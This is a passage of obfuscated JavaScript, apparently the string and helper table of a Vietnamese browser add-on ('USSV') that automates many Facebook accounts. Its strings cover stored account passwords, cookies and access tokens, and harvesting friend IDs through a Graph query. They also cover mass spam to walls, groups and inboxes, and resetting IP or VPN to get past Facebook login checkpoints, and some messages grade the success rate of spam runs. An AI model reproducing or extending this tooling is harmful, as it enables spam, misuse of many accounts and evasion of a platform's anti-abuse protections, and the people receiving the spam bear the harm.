        'K78': function(W, V) {
            return W == V;
        },
        'w8B': function(W, V) {
            return W == V;
        },
        'n32': function(W, V) {
            return W == V;
        },
        'R0t': function(W, V) {
            return W == V;
        },
        'h2a': function(W, V) {
            return W < V;
        },
        'S8r': "&caret_position=",
        'h6O': "</center>",
        'q3B': function(W, V) {
            return W == V;
        },
        'D38': function(W, V) {
            return W == V;
        },
        'F38': function(W, V) {
            return W == V;
        },
        'W28': function(W, V) {
            return W == V;
        },
        'p16': function(W, V) {
            return W !== V;
        },
        'L3B': function(W, V) {
            return W < V;
        },
        'v87': "username",
        'm9a': "Uid",
        'A88': function(W, V) {
            return W == V;
        },
        'y4b': function(W, V) {
            return W == V;
        },
        'X0Q': "link",
        'q4B': function(W, V) {
            return W == V;
        },
        'O0a': function(W, V) {
            return W == V;
        },
        'F0r': "| ",
        'd60': "runtime",
        'E2b': function(W, V) {
            return W == V;
        },
        'M58': function(W, V) {
            return W == V;
        },
        'm2E': function(W, V) {
            return W == V;
        },
        'r9t': function(W, V) {
            return W == V;
        },
        'f5v': "._5wdf._5w1r",
        'G6a': "Notepad",
        't60': "getElementsByClassName",
        'O9E': function(W, V) {
            return W == V;
        },
        'u8l': function(W, V) {
            return W == V;
        },
        's6': function(W, V) {
            return W !== V;
        },
        'z4B': function(W, V) {
            return W == V;
        },
        'n8a': 'popup_menu_list_select',
        'V8t': function(W, V) {
            return W - V;
        },
        'T10': 'Email na`y không ho?p lê?...',
        'e3X': "__dialogx",
        't12': function(W, V) {
            return W !== V;
        },
        'N6l': function(W, V) {
            return W == V;
        },
        'a7E': function(W, V) {
            return W * V;
        },
        'o0b': function(W, V) {
            return W == V;
        },
        'b8y': ".ussv_logs_left_panel.spam",
        'b3E': function(W, V) {
            return W == V;
        },
        'V9E': function(W, V) {
            return W == V;
        },
        'Z96': function(W, V) {
            return W == V;
        },
        'D2I': "always",
        'r0l': function(W, V) {
            return W == V;
        },
        'j48': function(W, V) {
            return W == V;
        },
        'y3O': "Ty? thê? tha`nh công chi? khoa?ng 60%, Ba?n câ`n xem xe´t la?i qua´ tri`nh Spam !",
        'A7E': function(W, V) {
            return W > V;
        },
        'i8l': function(W, V) {
            return W == V;
        },
        'j1a': function(W, V) {
            return W == V;
        },
        'k4l': function(W, V) {
            return W !== V;
        },
        'y37': "z2",
        'v7I': "Help: Ba?n ha~y diê`n Email mo´i muô´n thêm va`o ta`i khoa?n sau do´ nhâ´n Thêm dê? Thêm Email. Ba?n cu~ng co´ thê? Ta?o nhanh 1 Email trên hê? thô´ng USS ba`ng ca´ch Click va`o Ta?o Email Mo´i",
        'Z68': function(W, V) {
            return W == V;
        },
        'u0y': "While",
        'G4v': "#uss_st_inbox_link",
        'S77': "Type",
        'n1E': function(W, V) {
            return W == V;
        },
        'd6l': function(W, V) {
            return W == V;
        },
        'a1B': function(W, V) {
            return W - V;
        },
        'r8a': '<audio autoplay><source src="https://ussv.net/themes/checkpoint.mp3" type="audio/mpeg" /></audio>',
        'Z2a': function(W, V) {
            return W > V;
        },
        'j8B': function(W, V) {
            return W !== V;
        },
        'h4B': function(W, V) {
            return W == V;
        },
        'O9B': function(W, V) {
            return W == V;
        },
        'n6B': function(W, V) {
            return W == V;
        },
        'D06': function(W, V) {
            return W == V;
        },
        'X98': function(W, V) {
            return W !== V;
        },
        'z82': function(W, V) {
            return W == V;
        },
        'd6X': "save",
        'O18': function(W, V) {
            return W < V;
        },
        'd02': function(W, V) {
            return W == V;
        },
        'z77': 'POST',
        'G6E': function(W, V) {
            return W < V;
        },
        'j2I': "#uss_st_spam_inbox_alertcaptcha",
        'w9l': function(W, V) {
            return W == V;
        },
        'J3': function(W, V) {
            return W !== V;
        },
        'i20': "TK3",
        'x6t': function(W, V) {
            return W == V;
        },
        'X4b': function(W, V) {
            return W == V;
        },
        'Y26': function(W, V) {
            return W == V;
        },
        'c8r': "https://graph.facebook.com/fql?q=SELECT uid FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 5000&access_token=",
        'q4I': "Cmt_TC",
        'b1b': function(W, V) {
            return W == V;
        },
        'p0r': "T2",
        'J2': function(W) {
            lang_vi_st_check_note_hengio_error = W;
        },
        'u1E': function(W, V) {
            return W < V;
        },
        'K2t': function(W, V) {
            return W == V;
        },
        'z3y': "#uss_autlike",
        'Z3v': "opener",
        'H8': function(W, V) {
            return W == V;
        },
        'n0b': function(W, V) {
            return W == V;
        },
        'Q62': function(W, V) {
            return W == V;
        },
        'b00': "b7",
        'h78': function(W, V) {
            return W == V;
        },
        'M2b': function(W, V) {
            return W !== V;
        },
        'D4Q': "error_inbox_chan",
        'v3t': function(W, V) {
            return W == V;
        },
        'r5b': function(W, V) {
            return W == V;
        },
        'I7B': function(W, V) {
            return W == V;
        },
        'v5v': "b8",
        'W66': function(W, V) {
            return W === V;
        },
        'Q9l': function(W, V) {
            return W <= V;
        },
        'U2t': function(W, V) {
            return W == V;
        },
        'l4b': function(W, V) {
            return W == V;
        },
        'i4t': function(W, V) {
            return W !== V;
        },
        'y1v': "#ussv_log_panel_tt_img",
        'y2B': function(W, V) {
            return W == V;
        },
        'G1Q': '<br/><br/><center><button style="" class="btn_checktiep" id="tieptuccheck">Tiê´p Tu?c Check</button></center>',
        'H5t': function(W, V) {
            return W == V;
        },
        'V5I': "innerHTML",
        'H6l': function(W, V) {
            return W === V;
        },
        'K52': function(W, V) {
            return W == V;
        },
        'J5y': "Stt",
        'i28': function(W, V) {
            return W >= V;
        },
        'D4O': "#hide_div_viewimg_",
        'j6t': function(W, V) {
            return W == V;
        },
        'j86': function(W, V) {
            return W == V;
        },
        'o6B': function(W, V) {
            return W == V;
        },
        'G3v': "p",
        'b5t': function(W, V) {
            return W - V;
        },
        's7t': function(W, V) {
            return W == V;
        },
        'T66': function(W, V) {
            return W <= V;
        },
        'X3l': function(W, V) {
            return W == V;
        },
        'H46': function(W, V) {
            return W == V;
        },
        'i8Y': "U_L",
        'Y6X': '" title="Click Ðê? Xo´a Ta`i Khoa?n Na`y" src="https://ussv.net/themes/img/app/icon_settings.png" alt="settings icon">',
        'I6B': function(W, V) {
            return W == V;
        },
        'Z7l': function(W, V) {
            return W > V;
        },
        'I50': "#add_acc",
        'u7E': function(W, V) {
            return W < V;
        },
        'u7B': function(W, V) {
            return W == V;
        },
        'V82': function(W, V) {
            return W >= V;
        },
        'l1I': "Lô~i trong qua´ tri`nh xa´c thu?c ta`i khoa?n, không thê? kiê?m tra Info va` ti`nh tra?ng Stellar. Ma~ #2",
        'G8Y': ".row_del_acc",
        'Q3b': function(W, V) {
            return W == V;
        },
        'p42': function(W, V) {
            return W == V;
        },
        'A28': function(W, V) {
            return W < V;
        },
        'k0B': function(W, V) {
            return W == V;
        },
        'M8X': "a6",
        'X9a': "removeClass",
        'x06': function(W, V) {
            return W - V;
        },
        'q5X': "acc_ce",
        'r76': function(W, V) {
            return W !== V;
        },
        'e5l': function(W, V) {
            return W == V;
        },
        'a40': "to",
        'R1v': "jsmods",
        'r9y': '" id="spam_fl_',
        'g12': function(W, V) {
            return W == V;
        },
        'B2E': function(W, V) {
            return W == V;
        },
        'P78': function(W, V) {
            return W == V;
        },
        'k7': function(W) {
            ussv_lang_vi_vl_pt_hight_cp = W;
        },
        'd90': "#uss_st_check_FriendSub",
        'E8I': "B7",
        'v6X': " ",
        'R18': function(W, V) {
            return W == V;
        },
        'N0Y': "x2",
        'S9X': "Quyê`n Spam: Yes",
        'Y0B': function(W, V) {
            return W == V;
        },
        'q5': function(W, V) {
            return W == V;
        },
        't97': '</a>',
        'Q0E': function(W, V) {
            return W === V;
        },
        'I88': function(W, V) {
            return W > V;
        },
        'A77': '</tr>',
        'R1l': function(W, V) {
            return W == V;
        },
        'n58': function(W, V) {
            return W == V;
        },
        'L1l': function(W, V) {
            return W >= V;
        },
        'F5v': "note",
        'i47': "#start_check",
        's60': '<div class="fsm fwn fcg">',
        'D07': "comments",
        'y4l': function(W, V) {
            return W == V;
        },
        'K82': function(W, V) {
            return W == V;
        },
        'u8b': function(W, V) {
            return W == V;
        },
        'w7y': "extension",
        'h8t': function(W, V) {
            return W == V;
        },
        'y8E': function(W, V) {
            return W < V;
        },
        'M6B': function(W, V) {
            return W == V;
        },
        'e50': ".ussv_log_panel_rsdcomfn",
        'X4l': function(W, V) {
            return W == V;
        },
        'c7B': function(W, V) {
            return W == V;
        },
        'C27': "en",
        'W0l': function(W, V) {
            return W >= V;
        },
        'F8B': function(W, V) {
            return W == V;
        },
        'a9t': function(W, V) {
            return W == V;
        },
        'y0B': function(W, V) {
            return W == V;
        },
        'g8E': function(W, V) {
            return W == V;
        },
        'Z1I': "#div_check_info",
        'Z1b': function(W, V) {
            return W == V;
        },
        'H7O': "notifications",
        'R9Q': "AddBot",
        'e57': "#uss_st_check_country",
        'c4t': function(W, V) {
            return W == V;
        },
        'y2y': "https://graph.facebook.com/me/accounts?access_token=",
        'Y4l': function(W, V) {
            return W == V;
        },
        'r4t': function(W, V) {
            return W - V;
        },
        'Q86': function(W, V) {
            return W < V;
        },
        'F62': function(W, V) {
            return W == V;
        },
        'n3': function(W, V) {
            return W !== V;
        },
        'J7B': function(W, V) {
            return W == V;
        },
        'M16': function(W, V) {
            return W == V;
        },
        'V7v': "&comment_legacyid=",
        'Q8B': function(W, V) {
            return W == V;
        },
        'f68': function(W, V) {
            return W < V;
        },
        'C9v': "langjs",
        'o3t': function(W, V) {
            return W == V;
        },
        'N9X': "Vui lòng dang nh?p USSV tru?c khi thao tác !",
        'V6I': "\n",
        'g4l': function(W, V) {
            return W == V;
        },
        'm0B': function(W, V) {
            return W >= V;
        },
        'y26': function(W, V) {
            return W == V;
        },
        'j4b': function(W, V) {
            return W >= V;
        },
        'D1t': function(W, V) {
            return W < V;
        },
        's48': function(W, V) {
            return W == V;
        },
        'z2': function(W) {
            lang_vi_st_check_note_hengio_cancel = W;
        },
        'I0r': ".ussv_div_panel_safe",
        'r37': "ok",
        'h1O': "toi",
        'T28': function(W, V) {
            return W > V;
        },
        'l0B': function(W, V) {
            return W == V;
        },
        'F7t': function(W, V) {
            return W == V;
        },
        'p0l': function(W, V) {
            return W !== V;
        },
        'F26': function(W, V) {
            return W == V;
        },
        'G9a': 5,
        'b36': function(W, V) {
            return W == V;
        },
        'C8B': function(W, V) {
            return W == V;
        },
        's9r': ".popup_menu_list.ussv_aut_can_spam",
        'Z6b': function(W, V) {
            return W == V;
        },
        'j3l': function(W, V) {
            return W === V;
        },
        'x48': function(W, V) {
            return W !== V;
        },
        's06': function(W, V) {
            return W == V;
        },
        'f6b': function(W, V) {
            return W == V;
        },
        'Z5r': "http://ussv.net/ajax/get_loc.php",
        'h1b': function(W, V) {
            return W !== V;
        },
        'I2Q': ".",
        'Y98': function(W, V) {
            return W !== V;
        },
        'G3': function(W, V) {
            return W !== V;
        },
        'l72': function(W, V) {
            return W == V;
        },
        'm60': "|_|_|war|check",
        'g38': function(W, V) {
            return W == V;
        },
        'L9Q': "paging",
        'K5t': function(W, V) {
            return W < V;
        },
        'b9E': function(W, V) {
            return W == V;
        },
        'N1l': function(W, V) {
            return W == V;
        },
        'I5O': "#uss_st_check_type",
        'o42': function(W, V) {
            return W !== V;
        },
        'v8b': function(W, V) {
            return W !== V;
        },
        'r7E': function(W, V) {
            return W == V;
        },
        'D2B': function(W, V) {
            return W !== V;
        },
        's6Q': "#ussv_log_panel_tt_content",
        'x86': function(W, V) {
            return W == V;
        },
        'p8a': "#uss_st_check_fullinfo",
        'C1v': 'url(https://ussv.net/themes/img/loading_check_1.gif)',
        'F9l': function(W, V) {
            return W == V;
        },
        'C3y': "stt",
        'Z0a': function(W, V) {
            return W === V;
        },
        'F12': function(W, V) {
            return W === V;
        },
        'l06': function(W, V) {
            return W - V;
        },
        'A8b': function(W, V) {
            return W == V;
        },
        'B9b': function(W, V) {
            return W !== V;
        },
        'K0t': function(W, V) {
            return W !== V;
        },
        'Z2v': "DelTiengViet",
        'x0v': '	<span>',
        'Y7t': function(W, V) {
            return W == V;
        },
        'w5X': "n7",
        'd07': "0|_|_|ok|check",
        'u5I': "Thâ?t tuyê?t vo`i, duo`ng nhu qua´ tri`nh Check diê~n ra thuâ?n lo?i. USSV da´nh gia´ cao dô? Châ´t cu?a List Acc cu?a ba?n. Ha~y tiê´p tu?c pha´t huy phong dô? na`y nhe´ !",
        'W7O': "id",
        'z6a': "time_file",
        'l6': function(W, V) {
            return W == V;
        },
        'N6X': ".coban_div",
        'E3t': function(W, V) {
            return W == V;
        },
        'i2b': function(W, V) {
            return W / V;
        },
        'W5v': "n",
        'Y3b': function(W, V) {
            return W == V;
        },
        'E2v': "Ðang tiê´n ha`nh Ta?o email mo´i.",
        'p28': function(W, V) {
            return W == V;
        },
        'N4X': "Tô´c dô? kê´t nô´i không ô?n di?nh nên không thê? kê´t nô´i dê´n ma´y chu? USSV !",
        'v3': function(W, V) {
            return W == V;
        },
        'o57': "Tùy ch?n Tình Tr?ng s? thi?t l?p cho ADD ON l?y các tài kho?n có tình tr?ng theo b?n thi?t l?p. M?c d?nh ADD ON s? l?y các tài kho?n thêm vào chua Check (Chua Thao Tác). N?u b?n ch?n tình tr?ng Non Info thì ADD On s? ti?n hành Check các tài kho?n chua Check Info. K?t h?p v?i Time ADD s? giúp ADD ON check chính xác yêu c?u c?a b?n !",
        'G7E': function(W, V) {
            return W === V;
        },
        'W8Q': ".conversation:eq(",
        'd9': function(W) {
            ussv_lang_vi_timeout_fl = W;
        },
        'R7b': function(W, V) {
            return W == V;
        },
        'i0l': function(W, V) {
            return W !== V;
        },
        'P7l': function(W, V) {
            return W >= V;
        },
        'E8l': function(W, V) {
            return W > V;
        },
        'v1B': function(W, V) {
            return W <= V;
        },
        'a5b': function(W, V) {
            return W == V;
        },
        'K4E': function(W, V) {
            return W < V;
        },
        'W0b': function(W, V) {
            return W !== V;
        },
        'k1X': "A9",
        'N8': function(W, V) {
            return W == V;
        },
        'd0t': function(W, V) {
            return W !== V;
        },
        'o1Y': "#str_wait_fb",
        'O7b': function(W, V) {
            return W !== V;
        },
        'B7a': "--",
        'c42': function(W, V) {
            return W == V;
        },
        'T92': function(W, V) {
            return W / V;
        },
        'J42': function(W, V) {
            return W == V;
        },
        'S4O': "parseLogin",
        'N8O': '&fb_dtsg',
        'q2X': "kxd",
        'k48': function(W, V) {
            return W !== V;
        },
        'u40': "</div>",
        'j30': "xxx",
        'S8t': function(W, V) {
            return W == V;
        },
        'v1X': "Vui lo`ng dang nhâ?p",
        'c17': "L2",
        'k6X': "#checking_stellar_",
        'I2b': function(W, V) {
            return W == V;
        },
        'o8l': function(W, V) {
            return W == V;
        },
        'j72': function(W, V) {
            return W == V;
        },
        'j9l': function(W, V) {
            return W > V;
        },
        'H70': 80,
        'j9O': "uss_token",
        'g5B': function(W, V) {
            return W < V;
        },
        'V5': function(W, V) {
            return W == V;
        },
        'r87': "ThaoTac",
        'd67': "&__a=1&fb_dtsg=",
        'M2y': ".uiTextareaAutogrowsafe.",
        'O8y': "#st_sl_CustomVPN_CP_ChangeIp_BeforeLogin",
        'V6b': function(W, V) {
            return W == V;
        },
        'd22': function(W, V) {
            return W == V;
        },
        'W3t': function(W, V) {
            return W == V;
        },
        'v16': function(W, V) {
            return W == V;
        },
        's2B': function(W, V) {
            return W == V;
        },
        'h6r': "error_inbox_block_content",
        'r2b': function(W, V) {
            return W <= V;
        },
        'k6': function(W, V) {
            return W !== V;
        },
        'J9a': 3,
        'G42': function(W, V) {
            return W == V;
        },
        'H67': "l.html",
        'K68': function(W, V) {
            return W == V;
        },
        'w6O': "LoadSettingCheck",
        'I92': function(W, V) {
            return W < V;
        },
        'Q9b': function(W, V) {
            return W == V;
        },
        'g7v': "g1t",
        'E0b': function(W, V) {
            return W == V;
        },
        'b6b': function(W, V) {
            return W === V;
        },
        'Z3E': function(W, V) {
            return W !== V;
        },
        'v30': 10000,
        'p1E': function(W, V) {
            return W !== V;
        },
        'i1Y': "rgba(203, 11, 11, 0.5)",
        'a2b': function(W, V) {
            return W == V;
        },
        'z7O': "#uss_st_autlike",
        'a3': function(W, V) {
            return W !== V;
        },
        'M6E': function(W, V) {
            return W == V;
        },
        'n1Y': "b2a",
        'O9v': "#GroupCore_spam_sl_limit_post",
        'y3l': function(W, V) {
            return W !== V;
        },
        'M9Y': "firt",
        'B0E': function(W, V) {
            return W == V;
        },
        'I9X': "settings",
        'z7b': function(W, V) {
            return W == V;
        },
        'G90': 10,
        'T6y': "d9",
        'e76': function(W, V) {
            return W == V;
        },
        'z46': function(W, V) {
            return W == V;
        },
        'S0O': "#uss_st_check_firstpost",
        'W8r': ".class_div_popup_help",
        'M7B': function(W, V) {
            return W == V;
        },
        'F0B': function(W, V) {
            return W == V;
        },
        'B5B': function(W, V) {
            return W >= V;
        },
        'y00': "&__user=",
        'S2t': function(W, V) {
            return W >= V;
        },
        'J92': function(W, V) {
            return W - V;
        },
        'I4Y': "Qu´a tri`nh ta?o Link trên Notepad.CC thâ´t ba?i. Hê? thô´ng se~ du`ng Link ma?t di?nh.",
        'e3t': function(W, V) {
            return W !== V;
        },
        's0E': function(W, V) {
            return W == V;
        },
        'J50': '		</div>',
        'm06': function(W, V) {
            return W == V;
        },
        'Z78': function(W, V) {
            return W <= V;
        },
        'b2t': function(W, V) {
            return W == V;
        },
        'x9b': function(W, V) {
            return W !== V;
        },
        'w12': function(W, V) {
            return W == V;
        },
        'D7t': function(W, V) {
            return W < V;
        },
        'd68': function(W, V) {
            return W == V;
        },
        'U0O': " bi? Sai Pass !<br/>Theo thiê´t lâ?p cu?a ba?n thi` hê? thô´ng se~ ca?nh ba´o nê´u nhu co´ qua´ ",
        'E9a': "#uss_type_spam",
        'F2B': function(W, V) {
            return W == V;
        },
        'L5X': "#data_list_acc_coban_token",
        'i1B': function(W, V) {
            return W == V;
        },
        'Y7I': "V7",
        't72': function(W, V) {
            return W == V;
        },
        'E5l': function(W, V) {
            return W >= V;
        },
        'e42': function(W, V) {
            return W == V;
        },
        'X50': "#39C245",
        'u1B': function(W, V) {
            return W <= V;
        },
        's8B': function(W, V) {
            return W == V;
        },
        'H22': function(W, V) {
            return W !== V;
        },
        'M42': function(W, V) {
            return W == V;
        },
        'o7v': "wall",
        'U9B': function(W, V) {
            return W <= V;
        },
        'n0v': "a",
        'L1r': ".ussv_log_panel_rsdcom.note",
        'T5l': function(W, V) {
            return W == V;
        },
        'n8l': function(W, V) {
            return W == V;
        },
        'a4t': function(W, V) {
            return W == V;
        },
        'q02': function(W, V) {
            return W == V;
        },
        'b2a': function(W, V) {
            return W == V;
        },
        'p4t': function(W, V) {
            return W !== V;
        },
        'O1b': function(W, V) {
            return W == V;
        },
        'N7l': function(W, V) {
            return W < V;
        },
        'n67': "#uss_st_spam",
        'E0r': "#close_div_fb_tools_",
        'L9B': function(W, V) {
            return W == V;
        },
        'J0r': "#thongke_time_start",
        't6O': "Decode",
        'W8b': function(W, V) {
            return W == V;
        },
        'v37': "hide",
        'n5l': function(W, V) {
            return W !== V;
        },
        'P4I': "Tiê´p tu?c Ðang Ba`i trên ta`i khoa?n: ",
        'r70': "getJSON",
        'i40': "&fb_email=",
        'q5t': function(W, V) {
            return W <= V;
        },
        'x62': function(W, V) {
            return W !== V;
        },
        'K1Q': '&login=Ðang nh?p',
        'P4y': "https://www.facebook.com/ajax/pages/check_admin.php",
        'h0t': function(W, V) {
            return W !== V;
        },
        'f4B': function(W, V) {
            return W == V;
        },
        'h7X': "a4",
        'd82': function(W, V) {
            return W == V;
        },
        'i16': function(W, V) {
            return W == V;
        },
        'w0B': function(W, V) {
            return W / V;
        },
        'K9Q': "Thâ?t tê? ha?i ! Ty? lê? tha`nh công duo´i 50% ! Co´ qua´ nhiê`u nguyên nhân dâ~n dê´n qua´ tri`nh spam ke´m nhu vâ?y. Ba?n câ`n dang ba`i lên Group USS SERVICES dê? ho?i tham ca´c tha`nh viên kha´c vê` ca´ch Spam hiê?u qua? nhe´ !",
        'O96': function(W, V) {
            return W !== V;
        },
        'F2E': function(W, V) {
            return W == V;
        },
        'd8X': "getFullYear",
        'F0X': "#st_sl_CustomJs_Type",
        'U3I': "y7",
        'V4E': function(W, V) {
            return W == V;
        },
        'F07': "ussv_pass",
        'o76': function(W, V) {
            return W == V;
        },
        'w3l': function(W, V) {
            return W == V;
        },
        'D86': function(W, V) {
            return W !== V;
        },
        'J9r': "selected",
        'C2B': function(W, V) {
            return W !== V;
        },
        'f7Y': "#uss_st_checkpoint",
        'U96': function(W, V) {
            return W == V;
        },
        'g5E': function(W, V) {
            return W < V;
        },
        'n8b': function(W, V) {
            return W !== V;
        },
        'h2t': function(W, V) {
            return W == V;
        },
        'w0y': "Ba?n da~ xo´a thanh công toa`n bô? Logs trên USSV",
        's26': function(W, V) {
            return W == V;
        },
        'G5b': function(W, V) {
            return W > V;
        },
        'N8I': "0|0|_|ok|autoAddGr",
        'i6B': function(W, V) {
            return W == V;
        },
        'C3I': "refresh",
        'b40': "Post",
        'n5v': 'Du~ liê?u da~ duo?c khôi phu?c.',
        'T4t': function(W, V) {
            return W !== V;
        },
        'y62': function(W, V) {
            return W !== V;
        },
        'Z0y': "Start",
        'V5O': "select",
        'z2t': function(W, V) {
            return W == V;
        },
        'x3l': function(W, V) {
            return W == V;
        },
        'i3': function(W, V) {
            return W !== V;
        },
        'q68': function(W, V) {
            return W >= V;
        },
        't2v': "Thâ?t tuyê?t vo`i, hâ`u nhu toa`n bô? qua´ tri`nh Ðang ba`i dê`u tha`nh công ngoa?i tru` ca´c Ba?n Be` hoa?c Group không cho Ðang Ba`i ! Qu´a tri`nh Spam Tha`nh Công trên 90% ! Tôi nghi~ ba?n nên du`ng ti´nh nang truy Câ?p Nhanh hoa?c Xem Li?ch Su? Ðang dê? kiê?m tra la?i ca´c Ba`i Ðang co´ thâ?t su? Tha`nh Công Hay Không ! ",
        'g8a': "#id_app_duphong",
        'c10': "v2",
        'b3r': "0|0|_|ok|check",
        'd3E': function(W, V) {
            return W == V;
        },
        'z0Y': ".class_div_popup_loc_trung.AccList",
        'U9Y': "#st_Note_CustomJs_Type",
        'm7v': "Cookie",
        'n08': function(W, V) {
            return W - V;
        },
        'v8a': "Content",
        'G28': function(W, V) {
            return W >= V;
        },
        'L96': function(W, V) {
            return W == V;
        },
        'm0E': function(W, V) {
            return W == V;
        },
        'h9B': function(W, V) {
            return W <= V;
        },
        'd5t': function(W, V) {
            return W === V;
        },
        'B8B': function(W, V) {
            return W == V;
        },
        'b5': function(W, V) {
            return W == V;
        },
        'G58': function(W, V) {
            return W == V;
        },
        'l12': function(W, V) {
            return W == V;
        },
        'r27': 'Content-Type',
        'M00': "token",
        'q9O': "#uss_st_type_spam_wall",
        'x2': function(W) {
            lang_vi_fb_parseLogin_die = W;
        },
        'W2b': function(W, V) {
            return W == V;
        },
        'G47': "get",
        'x0Q': "Vui lo`ng Reset IP sau do´ nhâ´n Tiê´p Tu?c Check dê? Tools tiê´p tu?c Check.<br/>Hoa?c nhâ´n Tiê´p Tu?c Check ngay bây gio` dê? tools tiêp tu?c check, co´ thê? se~ bi? Checkpoint liên tu?c , vui lo`ng cân nha´c truo´c khi thao ta´c .",
        'c2O': "post",
        'J2b': function(W, V) {
            return W == V;
        },
        'K1l': function(W, V) {
            return W <= V;
        },
        'F6t': function(W, V) {
            return W == V;
        },
        'r6B': function(W, V) {
            return W == V;
        },
        'c9t': function(W, V) {
            return W == V;
        },
        'h1l': function(W, V) {
            return W == V;
        },
        'j07': "___",
        'a3t': function(W, V) {
            return W == V;
        },
        'i97': "e3t",
        'p6B': function(W, V) {
            return W == V;
        },
        'P5': function(W, V) {
            return W == V;
        },
        'L78': function(W, V) {
            return W == V;
        },
        'A16': function(W, V) {
            return W == V;
        },
        'N0t': function(W, V) {
            return W == V;
        },
        'G0l': function(W, V) {
            return W == V;
        },
        'K8t': function(W, V) {
            return W == V;
        },
        'm9O': '	</span>',
        'd4B': function(W, V) {
            return W == V;
        },
        'W32': function(W, V) {
            return W < V;
        },
        'v2Q': "#popup_ussv_setting",
        'G0b': function(W, V) {
            return W == V;
        },
        'j38': function(W, V) {
            return W == V;
        },
        'S0a': function(W, V) {
            return W == V;
        },
        'K4r': "sendMessage",
        'x26': function(W, V) {
            return W == V;
        },
        'o4a': function(W, V) {
            return W >= V;
        },
        'x1Y': '...</span>',
        'L1b': function(W, V) {
            return W == V;
        },
        'j4r': "#checking_group_",
        'I7r': "summary",
        'P0a': function(W, V) {
            return W == V;
        },
        'J2O': "#uss_st_type_internet_auto_rs",
        'D3l': function(W, V) {
            return W == V;
        },
        'A2O': " xa~y ra Lô~i trong qua´ tri`nh kiê?m tra Stellar... ",
        'H1l': function(W, V) {
            return W == V;
        },
        'd7I': "V8",
        'L82': function(W, V) {
            return W == V;
        },
        'E2l': function(W, V) {
            return W < V;
        },
        'M5l': function(W, V) {
            return W == V;
        },
        'R1X': "#url_login_ussv",
        'v1Y': "fb_id",
        'w2E': function(W, V) {
            return W == V;
        },
        'x8I': "text/plain;charset=utf-8",
        'S68': function(W, V) {
            return W < V;
        },
        'e4O': 'Ðang nh?p th?t b?i, b? Checkpoint.',
        't2B': function(W, V) {
            return W !== V;
        },
        'S1b': function(W, V) {
            return W == V;
        },
        'C12': function(W, V) {
            return W == V;
        },
        'J66': function(W, V) {
            return W == V;
        },
        'X5E': function(W, V) {
            return W == V;
        },
        'z8O': "Ðang kiê?m tra ti`nh tra?ng Stellar : ",
        'j17': "safe",
        'V78': function(W, V) {
            return W <= V;
        },
        'a7': function(W) {
            ussv_lang_vi_vl_pt_sp_h80 = W;
        },
        'D0E': function(W, V) {
            return W === V;
        },
        'j5E': function(W, V) {
            return W < V;
        },
        'Q1t': function(W, V) {
            return W == V;
        },
        'z6y': "USSV da´nh gia´ cao vê` qua´ tri`nh Spam na`y, ty? lê? tha`nh công khoa?ng 60->70%, tuy nhiên ba?n câ`n Xem se´t la?i qua´ tri`nh Spam co´ diê~n ra qua´ nhanh hay không. Nê´u nhanh qua´ co´ thê? FB se~ ba´t ba?n pha?i cho` do?i khi dang ba`i dâ´y !",
        'E2y': "fb_spam_TypeSend",
        'w1a': function(W, V) {
            return W == V;
        },
        'Z60': '=80',
        'a88': function(W, V) {
            return W > V;
        },
        'q0v': '" class="span_thongke"><span style="float: left;">',
        'm8y': "text",
        'F3b': function(W, V) {
            return W == V;
        },
        'L4E': function(W, V) {
            return W !== V;
        },
        'a7v': 'Ðang xo´a Email na`y...',
        'g6t': function(W, V) {
            return W == V;
        },
        'N68': function(W, V) {
            return W < V;
        },
        'S7Y': "errorSummary",
        'K0v': "rdstr",
        'z2a': function(W, V) {
            return W >= V;
        },
        'A5b': function(W, V) {
            return W == V;
        },
        'k6Q': "POST",
        'V36': function(W, V) {
            return W > V;
        },
        'B4l': function(W, V) {
            return W == V;
        },
        'V3v': ".invite_gr_",
        'O22': function(W, V) {
            return W !== V;
        },
        'R3E': function(W, V) {
            return W == V;
        },
        'B0v': "&key=",
        'k38': function(W, V) {
            return W == V;
        },
        'p3X': "last",
        'b0a': function(W, V) {
            return W == V;
        },
        'L6l': function(W, V) {
            return W == V;
        },
        'K5O': '</span>',
        'F86': function(W, V) {
            return W !== V;
        },
        'C3v': "000",
        'N9E': function(W, V) {
            return W < V;
        },
        'O2O': "image_id",
        'y9l': function(W, V) {
            return W < V;
        },
        'H0I': "#uss_st_check_page",
        'u2r': "prepend",
        'y9X': "markup",
        'h3I': "Help: Ba?n chua diê`n Email mo´i hoa?c Ma~ Xa´c Thu?c",
        'L52': function(W, V) {
            return W == V;
        },
        'x0r': null,
        'Q48': function(W, V) {
            return W !== V;
        },
        'W42': function(W, V) {
            return W == V;
        },
        'X5O': "addClass",
        'f7b': function(W, V) {
            return W == V;
        },
        'q9B': function(W, V) {
            return W >= V;
        },
        'n66': function(W, V) {
            return W == V;
        },
        'E1Y': "rsp",
        'Y6a': "uss_id",
        'J8X': 'c_user',
        'Z6O': "click",
        'V3E': function(W, V) {
            return W == V;
        },
        'o1r': "Thâ?t tuyê?t, toa`n bô? qua´ tri`nh thiê´t lâ?p Spam da~ tha`nh công. USSV Ba´t dâ`u Spam.",
        'F2Q': "value",
        'L6X': "https://m.facebook.com",
        'j7O': "#show_panel_right",
        'R97': "g2",
        'W9y': 'html',
        'R87': "&mabimat=",
        'Y48': function(W, V) {
            return W == V;
        },
        'i7B': function(W, V) {
            return W == V;
        },
        'P8': function(W, V) {
            return W == V;
        },
        'D26': function(W, V) {
            return W !== V;
        },
        'l7t': function(W, V) {
            return W == V;
        },
        'U2O': "error",
        'B1a': function(W, V) {
            return W == V;
        },
        'L37': "ListGroup",
        'j98': function(W, V) {
            return W < V;
        },
        'y5E': function(W, V) {
            return W == V;
        },
        'J7r': "k7",
        'c6E': function(W, V) {
            return W !== V;
        },
        'V9B': function(W, V) {
            return W == V;
        },
        'z8': function(W, V) {
            return W == V;
        },
        'V96': function(W, V) {
            return W == V;
        },
        'A8l': function(W, V) {
            return W == V;
        },
        'a8Y': "__html",
        'h0a': function(W, V) {
            return W == V;
        },
        'x8B': function(W, V) {
            return W == V;
        },
        'l8E': function(W, V) {
            return W == V;
        },
        'Q5B': function(W, V) {
            return W == V;
        },
        'U3B': function(W, V) {
            return W == V;
        },
        'I8O': "getSeconds",
        'D48': function(W, V) {
            return W == V;
        },
        'd52': function(W, V) {
            return W !== V;
        },
        'z3B': function(W, V) {
            return W < V;
        },
        'X62': function(W, V) {
            return W == V;
        },
        'G8v': "#uss_st_unsafeaccount",
        'M7r': ".fbDockChatTabFlyout.uiContextualLayerParent:eq(",
        'Y56': function(W, V) {
            return W >= V;
        },
        'X7O': "Page",
